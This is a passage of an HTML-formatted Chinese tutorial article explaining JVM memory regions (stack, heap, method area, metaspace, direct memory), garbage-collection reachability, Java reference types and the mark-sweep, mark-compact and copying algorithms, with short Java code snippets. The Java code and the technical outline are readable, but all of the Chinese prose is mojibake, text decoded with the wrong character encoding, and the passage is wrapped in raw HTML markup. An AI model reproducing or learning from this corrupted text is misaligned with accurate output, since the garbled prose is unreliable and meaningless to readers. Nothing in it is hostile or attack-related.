ä¸­é»˜è®¤ä¸º 256Kï¼Œè€Œåœ¨ JDK 1.5+ é»˜è®¤ä¸º 1Mï¼š</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">java</span> <span class=\"o\">-</span><span class=\"n\">Xss2M</span> <span class=\"n\">HackTheJava</span></code></pre></div><p>è¯¥åŒºåŸŸå¯èƒ½æŠ›å‡ºä»¥ä¸‹å¼‚å¸¸ï¼š</p><ul><li>å½“çº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦è¶…è¿‡æœ€å¤§å€¼ï¼Œä¼šæŠ›å‡º StackOverflowError å¼‚å¸¸ï¼›</li><li>æ ˆè¿›è¡ŒåŠ¨æ€æ‰©å±•æ—¶å¦‚æœæ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿå†…å­˜ï¼Œä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚</li></ul><h2>æœ¬åœ°æ–¹æ³•æ ˆ</h2><p>æœ¬åœ°æ–¹æ³•æ ˆä¸ Java è™šæ‹Ÿæœºæ ˆç±»ä¼¼ï¼Œå®ƒä»¬ä¹‹é—´çš„åŒºåˆ«åªä¸è¿‡æ˜¯æœ¬åœ°æ–¹æ³•æ ˆä¸ºæœ¬åœ°æ–¹æ³•æœåŠ¡ã€‚</p><p>æœ¬åœ°æ–¹æ³•ä¸€èˆ¬æ˜¯ç”¨å…¶å®ƒè¯­è¨€ï¼ˆCã€C++ æˆ–æ±‡ç¼–è¯­è¨€ç­‰ï¼‰ç¼–å†™çš„ï¼Œå¹¶ä¸”è¢«ç¼–è¯‘ä¸ºåŸºäºæœ¬æœºç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„ç¨‹åºï¼Œå¯¹å¾…è¿™äº›æ–¹æ³•éœ€è¦ç‰¹åˆ«å¤„ç†ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-11de47081dc95bfea1433985b1fa3874_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"538\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb\" width=\"538\" data-original=\"https://pic1.zhimg.com/v2-11de47081dc95bfea1433985b1fa3874_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;538&#39; height=&#39;281&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"538\" data-rawheight=\"281\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"538\" data-original=\"https://pic1.zhimg.com/v2-11de47081dc95bfea1433985b1fa3874_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-11de47081dc95bfea1433985b1fa3874_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å †</h2><p>æ‰€æœ‰å¯¹è±¡éƒ½åœ¨è¿™é‡Œåˆ†é…å†…å­˜ï¼Œæ˜¯åƒåœ¾æ”¶é›†çš„ä¸»è¦åŒºåŸŸï¼ˆ&#34;GC å †&#34;ï¼‰ã€‚</p><p>ç°ä»£çš„åƒåœ¾æ”¶é›†å™¨åŸºæœ¬éƒ½æ˜¯é‡‡ç”¨åˆ†ä»£æ”¶é›†ç®—æ³•ï¼Œå…¶ä¸»è¦çš„æ€æƒ³æ˜¯é’ˆå¯¹ä¸åŒç±»å‹çš„å¯¹è±¡é‡‡å–ä¸åŒçš„åƒåœ¾å›æ”¶ç®—æ³•ã€‚å¯ä»¥å°†å †åˆ†æˆä¸¤å—ï¼š</p><ul><li>æ–°ç”Ÿä»£ï¼ˆYoung Generationï¼‰</li><li>è€å¹´ä»£ï¼ˆOld Generationï¼‰</li></ul><p>å †ä¸éœ€è¦è¿ç»­å†…å­˜ï¼Œå¹¶ä¸”å¯ä»¥åŠ¨æ€å¢åŠ å…¶å†…å­˜ï¼Œå¢åŠ å¤±è´¥ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚</p><p>å¯ä»¥é€šè¿‡ -Xms å’Œ -Xmx è¿™ä¸¤ä¸ªè™šæ‹Ÿæœºå‚æ•°æ¥æŒ‡å®šä¸€ä¸ªç¨‹åºçš„å †å†…å­˜å¤§å°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è®¾ç½®åˆå§‹å€¼ï¼Œç¬¬äºŒä¸ªå‚æ•°è®¾ç½®æœ€å¤§å€¼ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">java</span> <span class=\"o\">-</span><span class=\"n\">Xms1M</span> <span class=\"o\">-</span><span class=\"n\">Xmx2M</span> <span class=\"n\">HackTheJava</span></code></pre></div><h2>æ–¹æ³•åŒº</h2><p>ç”¨äºå­˜æ”¾å·²è¢«åŠ è½½çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€å³æ—¶ç¼–è¯‘å™¨ç¼–è¯‘åçš„ä»£ç ç­‰æ•°æ®ã€‚</p><p>å’Œå †ä¸€æ ·ä¸éœ€è¦è¿ç»­çš„å†…å­˜ï¼Œå¹¶ä¸”å¯ä»¥åŠ¨æ€æ‰©å±•ï¼ŒåŠ¨æ€æ‰©å±•å¤±è´¥ä¸€æ ·ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚</p><p>å¯¹è¿™å—åŒºåŸŸè¿›è¡Œåƒåœ¾å›æ”¶çš„ä¸»è¦ç›®æ ‡æ˜¯å¯¹å¸¸é‡æ± çš„å›æ”¶å’Œå¯¹ç±»çš„å¸è½½ï¼Œä½†æ˜¯ä¸€èˆ¬æ¯”è¾ƒéš¾å®ç°ã€‚</p><p>HotSpot è™šæ‹ŸæœºæŠŠå®ƒå½“æˆæ°¸ä¹…ä»£æ¥è¿›è¡Œåƒåœ¾å›æ”¶ã€‚ä½†å¾ˆéš¾ç¡®å®šæ°¸ä¹…ä»£çš„å¤§å°ï¼Œå› ä¸ºå®ƒå—åˆ°å¾ˆå¤šå› ç´ å½±å“ï¼Œå¹¶ä¸”æ¯æ¬¡ Full GC ä¹‹åæ°¸ä¹…ä»£çš„å¤§å°éƒ½ä¼šæ”¹å˜ï¼Œæ‰€ä»¥ç»å¸¸ä¼šæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚ä¸ºäº†æ›´å®¹æ˜“ç®¡ç†æ–¹æ³•åŒºï¼Œä» JDK 1.8 å¼€å§‹ï¼Œç§»é™¤æ°¸ä¹…ä»£ï¼Œå¹¶æŠŠæ–¹æ³•åŒºç§»è‡³å…ƒç©ºé—´ï¼Œå®ƒä½äºæœ¬åœ°å†…å­˜ä¸­ï¼Œè€Œä¸æ˜¯è™šæ‹Ÿæœºå†…å­˜ä¸­ã€‚</p><p>æ–¹æ³•åŒºæ˜¯ä¸€ä¸ª JVM è§„èŒƒï¼Œæ°¸ä¹…ä»£ä¸å…ƒç©ºé—´éƒ½æ˜¯å…¶ä¸€ç§å®ç°æ–¹å¼ã€‚åœ¨ JDK 1.8 ä¹‹åï¼ŒåŸæ¥æ°¸ä¹…ä»£çš„æ•°æ®è¢«åˆ†åˆ°äº†å †å’Œå…ƒç©ºé—´ä¸­ã€‚å…ƒç©ºé—´å­˜å‚¨ç±»çš„å…ƒä¿¡æ¯ï¼Œé™æ€å˜é‡å’Œå¸¸é‡æ± ç­‰æ”¾å…¥å †ä¸­ã€‚</p><h2>è¿è¡Œæ—¶å¸¸é‡æ± </h2><p>è¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ã€‚</p><p>Class æ–‡ä»¶ä¸­çš„å¸¸é‡æ± ï¼ˆç¼–è¯‘å™¨ç”Ÿæˆçš„å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ï¼‰ä¼šåœ¨ç±»åŠ è½½åè¢«æ”¾å…¥è¿™ä¸ªåŒºåŸŸã€‚</p><p>é™¤äº†åœ¨ç¼–è¯‘æœŸç”Ÿæˆçš„å¸¸é‡ï¼Œè¿˜å…è®¸åŠ¨æ€ç”Ÿæˆï¼Œä¾‹å¦‚ String ç±»çš„ intern()ã€‚</p><h2>ç›´æ¥å†…å­˜</h2><p>åœ¨ JDK 1.4 ä¸­æ–°å¼•å…¥äº† NIO ç±»ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ Native å‡½æ•°åº“ç›´æ¥åˆ†é…å †å¤–å†…å­˜ï¼Œç„¶åé€šè¿‡ Java å †é‡Œçš„ DirectByteBuffer å¯¹è±¡ä½œä¸ºè¿™å—å†…å­˜çš„å¼•ç”¨è¿›è¡Œæ“ä½œã€‚è¿™æ ·èƒ½åœ¨ä¸€äº›åœºæ™¯ä¸­æ˜¾è‘—æé«˜æ€§èƒ½ï¼Œå› ä¸ºé¿å…äº†åœ¨å †å†…å­˜å’Œå †å¤–å†…å­˜æ¥å›æ‹·è´æ•°æ®ã€‚</p><h2>äºŒã€åƒåœ¾æ”¶é›†</h2><p>åƒåœ¾æ”¶é›†ä¸»è¦æ˜¯é’ˆå¯¹å †å’Œæ–¹æ³•åŒºè¿›è¡Œã€‚ç¨‹åºè®¡æ•°å™¨ã€è™šæ‹Ÿæœºæ ˆå’Œæœ¬åœ°æ–¹æ³•æ ˆè¿™ä¸‰ä¸ªåŒºåŸŸå±äºçº¿ç¨‹ç§æœ‰çš„ï¼Œåªå­˜åœ¨äºçº¿ç¨‹çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼Œçº¿ç¨‹ç»“æŸä¹‹åå°±ä¼šæ¶ˆå¤±ï¼Œå› æ­¤ä¸éœ€è¦å¯¹è¿™ä¸‰ä¸ªåŒºåŸŸè¿›è¡Œåƒåœ¾å›æ”¶ã€‚</p><h2>åˆ¤æ–­ä¸€ä¸ªå¯¹è±¡æ˜¯å¦å¯è¢«å›æ”¶</h2><h3>1. å¼•ç”¨è®¡æ•°ç®—æ³•</h3><p>ä¸ºå¯¹è±¡æ·»åŠ ä¸€ä¸ªå¼•ç”¨è®¡æ•°å™¨ï¼Œå½“å¯¹è±¡å¢åŠ ä¸€ä¸ªå¼•ç”¨æ—¶è®¡æ•°å™¨åŠ  1ï¼Œå¼•ç”¨å¤±æ•ˆæ—¶è®¡æ•°å™¨å‡ 1ã€‚å¼•ç”¨è®¡æ•°ä¸º 0 çš„å¯¹è±¡å¯è¢«å›æ”¶ã€‚</p><p>åœ¨ä¸¤ä¸ªå¯¹è±¡å‡ºç°å¾ªç¯å¼•ç”¨çš„æƒ…å†µä¸‹ï¼Œæ­¤æ—¶å¼•ç”¨è®¡æ•°å™¨æ°¸è¿œä¸ä¸º 0ï¼Œå¯¼è‡´æ— æ³•å¯¹å®ƒä»¬è¿›è¡Œå›æ”¶ã€‚æ­£æ˜¯å› ä¸ºå¾ªç¯å¼•ç”¨çš„å­˜åœ¨ï¼Œå› æ­¤ Java è™šæ‹Ÿæœºä¸ä½¿ç”¨å¼•ç”¨è®¡æ•°ç®—æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Test</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">Object</span> <span class=\"n\">instance</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">Test</span> <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Test</span><span class=\"o\">();</span>\n        <span class=\"n\">Test</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Test</span><span class=\"o\">();</span>\n        <span class=\"n\">a</span><span class=\"o\">.</span><span class=\"na\">instance</span> <span class=\"o\">=</span> <span class=\"n\">b</span><span class=\"o\">;</span>\n        <span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">instance</span> <span class=\"o\">=</span> <span class=\"n\">a</span><span class=\"o\">;</span>\n        <span class=\"n\">a</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>\n        <span class=\"n\">doSomething</span><span class=\"o\">();</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œa ä¸ b å¼•ç”¨çš„å¯¹è±¡å®ä¾‹äº’ç›¸æŒæœ‰äº†å¯¹è±¡çš„å¼•ç”¨ï¼Œå› æ­¤å½“æˆ‘ä»¬æŠŠå¯¹ a å¯¹è±¡ä¸ b å¯¹è±¡çš„å¼•ç”¨å»é™¤ä¹‹åï¼Œç”±äºä¸¤ä¸ªå¯¹è±¡è¿˜å­˜åœ¨äº’ç›¸ä¹‹é—´çš„å¼•ç”¨ï¼Œå¯¼è‡´ä¸¤ä¸ª Test å¯¹è±¡æ— æ³•è¢«å›æ”¶ã€‚</p><h3>2. å¯è¾¾æ€§åˆ†æç®—æ³•</h3><p>ä»¥ GC Roots ä¸ºèµ·å§‹ç‚¹è¿›è¡Œæœç´¢ï¼Œå¯è¾¾çš„å¯¹è±¡éƒ½æ˜¯å­˜æ´»çš„ï¼Œä¸å¯è¾¾çš„å¯¹è±¡å¯è¢«å›æ”¶ã€‚</p><p>Java è™šæ‹Ÿæœºä½¿ç”¨è¯¥ç®—æ³•æ¥åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è¢«å›æ”¶ï¼ŒGC Roots ä¸€èˆ¬åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š</p><ul><li>è™šæ‹Ÿæœºæ ˆä¸­å±€éƒ¨å˜é‡è¡¨ä¸­å¼•ç”¨çš„å¯¹è±¡</li><li>æœ¬åœ°æ–¹æ³•æ ˆä¸­ JNI ä¸­å¼•ç”¨çš„å¯¹è±¡</li><li>æ–¹æ³•åŒºä¸­ç±»é™æ€å±æ€§å¼•ç”¨çš„å¯¹è±¡</li><li>æ–¹æ³•åŒºä¸­çš„å¸¸é‡å¼•ç”¨çš„å¯¹è±¡</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-185d5df4e82924c1f04d7ba12337ceb5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"532\" data-rawheight=\"342\" class=\"origin_image zh-lightbox-thumb\" width=\"532\" data-original=\"https://pic2.zhimg.com/v2-185d5df4e82924c1f04d7ba12337ceb5_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;532&#39; height=&#39;342&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"532\" data-rawheight=\"342\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"532\" data-original=\"https://pic2.zhimg.com/v2-185d5df4e82924c1f04d7ba12337ceb5_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-185d5df4e82924c1f04d7ba12337ceb5_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>3. æ–¹æ³•åŒºçš„å›æ”¶</h3><p>å› ä¸ºæ–¹æ³•åŒºä¸»è¦å­˜æ”¾æ°¸ä¹…ä»£å¯¹è±¡ï¼Œè€Œæ°¸ä¹…ä»£å¯¹è±¡çš„å›æ”¶ç‡æ¯”æ–°ç”Ÿä»£ä½å¾ˆå¤šï¼Œæ‰€ä»¥åœ¨æ–¹æ³•åŒºä¸Šè¿›è¡Œå›æ”¶æ€§ä»·æ¯”ä¸é«˜ã€‚</p><p>ä¸»è¦æ˜¯å¯¹å¸¸é‡æ± çš„å›æ”¶å’Œå¯¹ç±»çš„å¸è½½ã€‚</p><p>ä¸ºäº†é¿å…å†…å­˜æº¢å‡ºï¼Œåœ¨å¤§é‡ä½¿ç”¨åå°„å’ŒåŠ¨æ€ä»£ç†çš„åœºæ™¯éƒ½éœ€è¦è™šæ‹Ÿæœºå…·å¤‡ç±»å¸è½½åŠŸèƒ½ã€‚</p><p>ç±»çš„å¸è½½æ¡ä»¶å¾ˆå¤šï¼Œéœ€è¦æ»¡è¶³ä»¥ä¸‹ä¸‰ä¸ªæ¡ä»¶ï¼Œå¹¶ä¸”æ»¡è¶³äº†æ¡ä»¶ä¹Ÿä¸ä¸€å®šä¼šè¢«å¸è½½ï¼š</p><ul><li>è¯¥ç±»æ‰€æœ‰çš„å®ä¾‹éƒ½å·²ç»è¢«å›æ”¶ï¼Œæ­¤æ—¶å †ä¸­ä¸å­˜åœ¨è¯¥ç±»çš„ä»»ä½•å®ä¾‹ã€‚</li><li>åŠ è½½è¯¥ç±»çš„ ClassLoader å·²ç»è¢«å›æ”¶ã€‚</li><li>è¯¥ç±»å¯¹åº”çš„ Class å¯¹è±¡æ²¡æœ‰åœ¨ä»»ä½•åœ°æ–¹è¢«å¼•ç”¨ï¼Œä¹Ÿå°±æ— æ³•åœ¨ä»»ä½•åœ°æ–¹é€šè¿‡åå°„è®¿é—®è¯¥ç±»æ–¹æ³•ã€‚</li></ul><h3>4. finalize()</h3><p>ç±»ä¼¼ C++ çš„ææ„å‡½æ•°ï¼Œç”¨äºå…³é—­å¤–éƒ¨èµ„æºã€‚ä½†æ˜¯ try-finally ç­‰æ–¹å¼å¯ä»¥åšå¾—æ›´å¥½ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•è¿è¡Œä»£ä»·å¾ˆé«˜ï¼Œä¸ç¡®å®šæ€§å¤§ï¼Œæ— æ³•ä¿è¯å„ä¸ªå¯¹è±¡çš„è°ƒç”¨é¡ºåºï¼Œå› æ­¤æœ€å¥½ä¸è¦ä½¿ç”¨ã€‚</p><p>å½“ä¸€ä¸ªå¯¹è±¡å¯è¢«å›æ”¶æ—¶ï¼Œå¦‚æœéœ€è¦æ‰§è¡Œè¯¥å¯¹è±¡çš„ finalize() æ–¹æ³•ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½åœ¨è¯¥æ–¹æ³•ä¸­è®©å¯¹è±¡é‡æ–°è¢«å¼•ç”¨ï¼Œä»è€Œå®ç°è‡ªæ•‘ã€‚è‡ªæ•‘åªèƒ½è¿›è¡Œä¸€æ¬¡ï¼Œå¦‚æœå›æ”¶çš„å¯¹è±¡ä¹‹å‰è°ƒç”¨äº† finalize() æ–¹æ³•è‡ªæ•‘ï¼Œåé¢å›æ”¶æ—¶ä¸ä¼šå†è°ƒç”¨è¯¥æ–¹æ³•ã€‚</p><h2>å¼•ç”¨ç±»å‹</h2><p>æ— è®ºæ˜¯é€šè¿‡å¼•ç”¨è®¡æ•°ç®—æ³•åˆ¤æ–­å¯¹è±¡çš„å¼•ç”¨æ•°é‡ï¼Œè¿˜æ˜¯é€šè¿‡å¯è¾¾æ€§åˆ†æç®—æ³•åˆ¤æ–­å¯¹è±¡æ˜¯å¦å¯è¾¾ï¼Œåˆ¤å®šå¯¹è±¡æ˜¯å¦å¯è¢«å›æ”¶éƒ½ä¸å¼•ç”¨æœ‰å…³ã€‚</p><p>Java æä¾›äº†å››ç§å¼ºåº¦ä¸åŒçš„å¼•ç”¨ç±»å‹ã€‚</p><h3>1. å¼ºå¼•ç”¨</h3><p>è¢«å¼ºå¼•ç”¨å…³è”çš„å¯¹è±¡ä¸ä¼šè¢«å›æ”¶ã€‚</p><p>ä½¿ç”¨ new ä¸€ä¸ªæ–°å¯¹è±¡çš„æ–¹å¼æ¥åˆ›å»ºå¼ºå¼•ç”¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Object</span> <span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Object</span><span class=\"o\">();</span></code></pre></div><h3>2. è½¯å¼•ç”¨</h3><p>è¢«è½¯å¼•ç”¨å…³è”çš„å¯¹è±¡åªæœ‰åœ¨å†…å­˜ä¸å¤Ÿçš„æƒ…å†µä¸‹æ‰ä¼šè¢«å›æ”¶ã€‚</p><p>ä½¿ç”¨ SoftReference ç±»æ¥åˆ›å»ºè½¯å¼•ç”¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Object</span> <span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Object</span><span class=\"o\">();</span>\n<span class=\"n\">SoftReference</span><span class=\"o\">&lt;</span><span class=\"n\">Object</span><span class=\"o\">&gt;</span> <span class=\"n\">sf</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SoftReference</span><span class=\"o\">&lt;</span><span class=\"n\">Object</span><span class=\"o\">&gt;(</span><span class=\"n\">obj</span><span class=\"o\">);</span>\n<span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span>  <span class=\"o\">//</span> <span class=\"n\">ä½¿å¯¹è±¡åªè¢«è½¯å¼•ç”¨å…³è”</span></code></pre></div><h3>3. å¼±å¼•ç”¨</h3><p>è¢«å¼±å¼•ç”¨å…³è”çš„å¯¹è±¡ä¸€å®šä¼šè¢«å›æ”¶ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒåªèƒ½å­˜æ´»åˆ°ä¸‹ä¸€æ¬¡åƒåœ¾å›æ”¶å‘ç”Ÿä¹‹å‰ã€‚</p><p>ä½¿ç”¨ WeakReference ç±»æ¥åˆ›å»ºå¼±å¼•ç”¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Object</span> <span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Object</span><span class=\"o\">();</span>\n<span class=\"n\">WeakReference</span><span class=\"o\">&lt;</span><span class=\"n\">Object</span><span class=\"o\">&gt;</span> <span class=\"n\">wf</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">WeakReference</span><span class=\"o\">&lt;</span><span class=\"n\">Object</span><span class=\"o\">&gt;(</span><span class=\"n\">obj</span><span class=\"o\">);</span>\n<span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span></code></pre></div><h3>4. è™šå¼•ç”¨</h3><p>åˆç§°ä¸ºå¹½çµå¼•ç”¨æˆ–è€…å¹»å½±å¼•ç”¨ï¼Œä¸€ä¸ªå¯¹è±¡æ˜¯å¦æœ‰è™šå¼•ç”¨çš„å­˜åœ¨ï¼Œä¸ä¼šå¯¹å…¶ç”Ÿå­˜æ—¶é—´é€ æˆå½±å“ï¼Œä¹Ÿæ— æ³•é€šè¿‡è™šå¼•ç”¨å¾—åˆ°ä¸€ä¸ªå¯¹è±¡ã€‚</p><p>ä¸ºä¸€ä¸ªå¯¹è±¡è®¾ç½®è™šå¼•ç”¨çš„å”¯ä¸€ç›®çš„æ˜¯èƒ½åœ¨è¿™ä¸ªå¯¹è±¡è¢«å›æ”¶æ—¶æ”¶åˆ°ä¸€ä¸ªç³»ç»Ÿé€šçŸ¥ã€‚</p><p>ä½¿ç”¨ PhantomReference æ¥åˆ›å»ºè™šå¼•ç”¨ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Object</span> <span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Object</span><span class=\"o\">();</span>\n<span class=\"n\">PhantomReference</span><span class=\"o\">&lt;</span><span class=\"n\">Object</span><span class=\"o\">&gt;</span> <span class=\"n\">pf</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">PhantomReference</span><span class=\"o\">&lt;</span><span class=\"n\">Object</span><span class=\"o\">&gt;(</span><span class=\"n\">obj</span><span class=\"o\">,</span> <span class=\"kc\">null</span><span class=\"o\">);</span>\n<span class=\"n\">obj</span> <span class=\"o\">=</span> <span class=\"kc\">null</span><span class=\"o\">;</span></code></pre></div><h2>åƒåœ¾æ”¶é›†ç®—æ³•</h2><h3>1. æ ‡è®° - æ¸…é™¤</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-722cb484c4fb1761a3c5920480d62458_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"658\" data-rawheight=\"369\" class=\"origin_image zh-lightbox-thumb\" width=\"658\" data-original=\"https://pic1.zhimg.com/v2-722cb484c4fb1761a3c5920480d62458_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;658&#39; height=&#39;369&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"658\" data-rawheight=\"369\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"658\" data-original=\"https://pic1.zhimg.com/v2-722cb484c4fb1761a3c5920480d62458_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-722cb484c4fb1761a3c5920480d62458_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>åœ¨æ ‡è®°é˜¶æ®µï¼Œç¨‹åºä¼šæ£€æŸ¥æ¯ä¸ªå¯¹è±¡æ˜¯å¦ä¸ºæ´»åŠ¨å¯¹è±¡ï¼Œå¦‚æœæ˜¯æ´»åŠ¨å¯¹è±¡ï¼Œåˆ™ç¨‹åºä¼šåœ¨å¯¹è±¡å¤´éƒ¨æ‰“ä¸Šæ ‡è®°ã€‚</p><p>åœ¨æ¸…é™¤é˜¶æ®µï¼Œä¼šè¿›è¡Œå¯¹è±¡å›æ”¶å¹¶å–æ¶ˆæ ‡å¿—ä½ï¼Œå¦å¤–ï¼Œè¿˜ä¼šåˆ¤æ–­å›æ”¶åçš„åˆ†å—ä¸å‰ä¸€ä¸ªç©ºé—²åˆ†å—æ˜¯å¦è¿ç»­ï¼Œè‹¥è¿ç»­ï¼Œä¼šåˆå¹¶è¿™ä¸¤ä¸ªåˆ†å—ã€‚å›æ”¶å¯¹è±¡å°±æ˜¯æŠŠå¯¹è±¡ä½œä¸ºåˆ†å—ï¼Œè¿æ¥åˆ°è¢«ç§°ä¸º â€œç©ºé—²é“¾è¡¨â€ çš„å•å‘é“¾è¡¨ï¼Œä¹‹åè¿›è¡Œåˆ†é…æ—¶åªéœ€è¦éå†è¿™ä¸ªç©ºé—²é“¾è¡¨ï¼Œå°±å¯ä»¥æ‰¾åˆ°åˆ†å—ã€‚</p><p>åœ¨åˆ†é…æ—¶ï¼Œç¨‹åºä¼šæœç´¢ç©ºé—²é“¾è¡¨å¯»æ‰¾ç©ºé—´å¤§äºç­‰äºæ–°å¯¹è±¡å¤§å° size çš„å— blockã€‚å¦‚æœå®ƒæ‰¾åˆ°çš„å—ç­‰äº sizeï¼Œä¼šç›´æ¥è¿”å›è¿™ä¸ªåˆ†å—ï¼›å¦‚æœæ‰¾åˆ°çš„å—å¤§äº sizeï¼Œä¼šå°†å—åˆ†å‰²æˆå¤§å°ä¸º size ä¸ (block - size) çš„ä¸¤éƒ¨åˆ†ï¼Œè¿”å›å¤§å°ä¸º size çš„åˆ†å—ï¼Œå¹¶æŠŠå¤§å°ä¸º (block - size) çš„å—è¿”å›ç»™ç©ºé—²é“¾è¡¨ã€‚</p><p>ä¸è¶³ï¼š</p><ul><li>æ ‡è®°å’Œæ¸…é™¤è¿‡ç¨‹æ•ˆç‡éƒ½ä¸é«˜ï¼›</li><li>ä¼šäº§ç”Ÿå¤§é‡ä¸è¿ç»­çš„å†…å­˜ç¢ç‰‡ï¼Œå¯¼è‡´æ— æ³•ç»™å¤§å¯¹è±¡åˆ†é…å†…å­˜ã€‚</li></ul><h3>2. æ ‡è®° - æ•´ç†</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-cc95191c9f5a2028d291ccdfc0509f5b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"658\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"658\" data-original=\"https://pic4.zhimg.com/v2-cc95191c9f5a2028d291ccdfc0509f5b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;658&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"658\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"658\" data-original=\"https://pic4.zhimg.com/v2-cc95191c9f5a2028d291ccdfc0509f5b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-cc95191c9f5a2028d291ccdfc0509f5b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>è®©æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡éƒ½å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åç›´æ¥æ¸…ç†æ‰ç«¯è¾¹ç•Œä»¥å¤–çš„å†…å­˜ã€‚</p><p>ä¼˜ç‚¹:</p><ul><li>ä¸ä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡</li></ul><p>ä¸è¶³:</p><ul><li>éœ€è¦ç§»åŠ¨å¤§é‡å¯¹è±¡ï¼Œå¤„ç†æ•ˆç‡æ¯”è¾ƒä½ã€‚</li></ul><h3>3. å¤åˆ¶</h3><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-8fa24f2ef95d40e1357f4c2fe897eb9a_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"650\" 